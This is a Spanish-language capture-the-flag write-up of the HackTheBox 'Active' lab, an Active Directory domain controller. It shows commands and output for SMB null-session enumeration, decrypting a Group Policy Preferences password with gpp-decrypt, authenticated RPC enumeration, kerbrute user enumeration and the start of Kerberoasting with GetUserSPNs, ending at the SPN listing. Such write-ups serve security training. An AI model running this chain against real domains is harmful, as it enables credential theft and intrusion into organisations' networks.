<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HTB active AD - Bast1ant1c</title>
<meta name="description" content="Vamos a resolver la máquina active AD de HackTheBox. ¡Let’s hack!">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Bast1ant1c">
<meta property="og:title" content="HTB active AD">
<meta property="og:url" content="http://localhost:4000/active/">


  <meta property="og:description" content="Vamos a resolver la máquina active AD de HackTheBox. ¡Let’s hack!">



  <meta property="og:image" content="http://localhost:4000/assets/images/active/01-inicio.png">





  <meta property="article:published_time" content="2023-01-18T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/active/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Bast1ant1c",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li><li class="masthead__menu-item">
              <a href="/" >Blog</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/halloffame/" >Hall of Fame</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Search</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">HTB active AD</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="BAST1ANT1C" itemprop="image" style="padding:25px;border:5px solid #434040;max-width:130px;border-radius:10%;">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">BAST1ANT1C</h3>
    
    
      <p class="author__bio" itemprop="description">
        Ethical hacker | eJPT
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      
        <li>
          <a href="https://github.com/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      
      
      
        <li>
          <a href="https://instagram.com/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
          </a>
        </li>
      

      
        <li>
          <a href="https://tiktok.com/@bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-tiktok" aria-hidden="true"></i> TikTok
          </a>
        </li>
      
      
      

      

      

      



      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HTB active AD">
    <meta itemprop="description" content="Vamos a resolver la máquina active AD de HackTheBox. ¡Let’s hack!">
    <meta itemprop="datePublished" content="January 18, 2023">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HTB active AD
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-01-18T00:00:00-05:00">January 18, 2023 </time>&emsp;
          
          
        </p>
        <p align="center">
<img src="/assets/images/active/02-tarjeta.png" />
</p>

<p>¡Hola!
En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">active</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>

<h2 id="preparación">PREPARACIÓN</h2>

<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">active</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack active
<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
</code></pre></div></div>

<h2 id="reconocimiento">RECONOCIMIENTO</h2>

<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.100
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...

<span class="o">[</span>+] 10.10.10.100 <span class="nv">ttl</span><span class="o">=</span>127 <span class="o">&gt;&gt;</span> Windows
</code></pre></div></div>

<p>Identificamos que es una maquina <strong>Windows</strong> debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>

<ul>
  <li>TTL =&gt; 64	Linux</li>
  <li>TTL =&gt; 128	Windows</li>
</ul>

<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.100 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49168/tcp open  unknown
49169/tcp open  unknown
</code></pre></div></div>

<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49168,49169 <span class="nt">-sCV</span> 10.10.10.100 <span class="nt">-oN</span> versions
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-01-13 03:25:37Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>

<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
nvim /etc/hosts
10.10.10.100  DC DC.active.htb active.htb
</code></pre></div></div>

<h2 id="smb-null-session-enum">SMB NULL SESSION ENUM</h2>

<p>Eumeramos información por null session</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100 <span class="nt">--shares</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.10.10.100 <span class="nt">-N</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk
</code></pre></div></div>

<p>Revisamos los archivos con capacidad de lectura, encontrando <code class="language-plaintext highlighter-rouge">groups.xml</code>, el cual contiene una credencial codificada, por lo tanto descargamos este archivo en nuestra máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> <span class="s2">"Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">--download</span> <span class="s2">"Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>10.10.10.100-Replication_active.htb_Policies_<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="se">\}</span>_MACHINE_Preferences_Groups_Groups.xml groups.xml
</code></pre></div></div>

<h2 id="decrypt-groupsxml-password">DECRYPT GROUPS.XML PASSWORD</h2>

<p>Vamos a proceder a desencriptar esta credencial para el usuario <code class="language-plaintext highlighter-rouge">SVC_TGS</code> con la utilidad <code class="language-plaintext highlighter-rouge">gpp-decrypt</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>groups.xml
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GPPstillStandingStrong2k18
</code></pre></div></div>

<h2 id="granted-smb-access-svc_tgs-user">GRANTED SMB ACCESS SVC_TGS USER</h2>

<p>Tenemos una credencial! Es momento de ponerlo a prueba con la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio del protocolo <code class="language-plaintext highlighter-rouge">smb</code>, donde tenemos acceso a más recursos compartidos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--shares</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.100    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.100    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.10.100    445    DC               IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ  
</code></pre></div></div>

<h2 id="flag-usertxt-smb">FLAG USER.TXT (SMB)</h2>

<p>Luego de revisar los archivos, encontramos la flag <code class="language-plaintext highlighter-rouge">user.txt</code>, siendo así descargamos el archivo y lo miramos en nuestra máquina atacante.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS/Desktop/user.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head</span> <span class="nt">-c</span> 10 user.txt<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0f832bb8a8
</code></pre></div></div>

<h2 id="ad-enum-rpcclient-with-creds">AD ENUM RPCCLIENT (WITH CREDS)</h2>

<p>Ahora que tenemos credenciales, vamos a realizar una enumeración por <code class="language-plaintext highlighter-rouge">RPC</code> con la utilidad <code class="language-plaintext highlighter-rouge">rpcclient</code></p>

<h3 id="enumeración-de-usuarios-null-session">ENUMERACIÓN DE USUARIOS NULL SESSION</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.100 <span class="nt">-N</span> <span class="nt">-c</span> enumdomusers
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<h3 id="creación-de-listado-de-usuarios">CREACIÓN DE LISTADO DE USUARIOS</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'SVC_TGS%GPPstillStandingStrong2k18'</span> 10.10.10.100 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> 0x | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
</code></pre></div></div>

<h3 id="enumeración-de-grupos">ENUMERACIÓN DE GRUPOS</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'SVC_TGS%GPPstillStandingStrong2k18'</span> 10.10.10.100 <span class="nt">-c</span> enumdomgroups
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
</code></pre></div></div>

<h3 id="enumeración-miembros-grupo-domain-admins-0x200">ENUMERACIÓN MIEMBROS GRUPO DOMAIN ADMINS (0X200)</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'SVC_TGS%GPPstillStandingStrong2k18'</span> 10.10.10.100 <span class="nt">-c</span> <span class="s2">"querygroupmem 0x200"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	rid:[0x1f4] attr:[0x7]
</code></pre></div></div>

<h3 id="enumeración-de-usuario-administrator-del-grupo-domain-admins-0x1f4">ENUMERACIÓN DE USUARIO ADMINISTRATOR DEL GRUPO DOMAIN ADMINS (0X1F4)</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'SVC_TGS%GPPstillStandingStrong2k18'</span> 10.10.10.100 <span class="nt">-c</span> <span class="s2">"queryuser 0x1f4"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account <span class="k">for </span>administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 12 ene 2023 22:10:29 <span class="nt">-05</span>
	Logoff Time              :	mié, 31 dic 1969 19:00:00 <span class="nt">-05</span>
	Kickoff Time             :	mié, 31 dic 1969 19:00:00 <span class="nt">-05</span>
	Password last <span class="nb">set </span>Time   :	mié, 18 jul 2018 14:06:40 <span class="nt">-05</span>
	Password can change Time :	jue, 19 jul 2018 14:06:40 <span class="nt">-05</span>
	Password must change Time:	mié, 13 sep 30828 21:48:05 <span class="nt">-05</span>
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000041
	padding1[0..7]...
	logon_hrs[0..21]...
</code></pre></div></div>

<h3 id="enumeración-descripciones-de-usuarios">ENUMERACIÓN DESCRIPCIONES DE USUARIOS</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'SVC_TGS%GPPstillStandingStrong2k18'</span> 10.10.10.100 <span class="nt">-c</span> <span class="s2">"querydispinfo"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: <span class="o">(</span>null<span class="o">)</span>
</code></pre></div></div>

<h2 id="kerbrute-install">KERBRUTE INSTALL</h2>

<p>Instalamos la utilidad <code class="language-plaintext highlighter-rouge">kerbrute</code> para poder enumerar usuarios por medio del protocolo <code class="language-plaintext highlighter-rouge">kerberos</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone http://github.com/ropnop/kerbrute
<span class="nb">cd </span>kerbrute
go build <span class="nb">.</span>
go build <span class="nt">-ldflags</span> <span class="s1">'-s -w'</span> <span class="nb">.</span>
upx kerbrute
<span class="nb">mv </span>kerbrute /usr/bin/kerbrute
</code></pre></div></div>

<h2 id="tgt-kerbrute-enum">TGT KERBRUTE ENUM</h2>

<p>Procedemos con la emumeración de usuarios que capturamos anteriormente en el archivo <code class="language-plaintext highlighter-rouge">users.txt</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> active.htb <span class="nt">--dc</span> 10.10.10.100 users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/12/23 - Ronnie Flathers @ropnop

2023/01/12 23:40:30 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2023/01/12 23:40:30 <span class="o">&gt;</span>  	10.10.10.100:88

2023/01/12 23:40:30 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Administrator@active.htb
2023/01/12 23:40:30 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	SVC_TGS@active.htb
2023/01/12 23:40:30 <span class="o">&gt;</span>  Done! Tested 4 usernames <span class="o">(</span>2 valid<span class="o">)</span> <span class="k">in </span>0.099 seconds
</code></pre></div></div>

<h2 id="ad-tgt-getnpuserspy">AD TGT GETNPUSERS.PY</h2>

<p>Otra manera de enumerar usuarios validos del dominio es con la utilidad <code class="language-plaintext highlighter-rouge">GetNPUsers</code> de la suite de <code class="language-plaintext highlighter-rouge">Impacket</code>, en esta ocasión podemos corroborar los dos usuarios validos encontrados anteriormente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers active.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User SVC_TGS doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<h2 id="getuserspns-enum-kerberoasting-attack">GETUSERSPNS ENUM (KERBEROASTING ATTACK)</h2>

<p>Ahora que tenemos credenciales, vamos a sacar provecho y capturar el hash <code class="language-plaintext highlighter-rouge">NTMLv2</code> en caso de que sea posible, para que, posteriormente logremos por fuerza bruta romper este hash y obtener una contraseña en texto plano. Primero se consulta si es posible obtener el hash y luego lo solicitamos, todo por medio de la utilidad <code class="language-plaintext highlighter-rouge">GetUserSPNs</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs <span class="s2">"active.htb/SVC_TGS:GPPstillStandingStrong2k18"</span> <span class="nt">-dc-ip</span> 10.10.10.100
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-12 22:10:28.819364             
</code></pre></div></div>

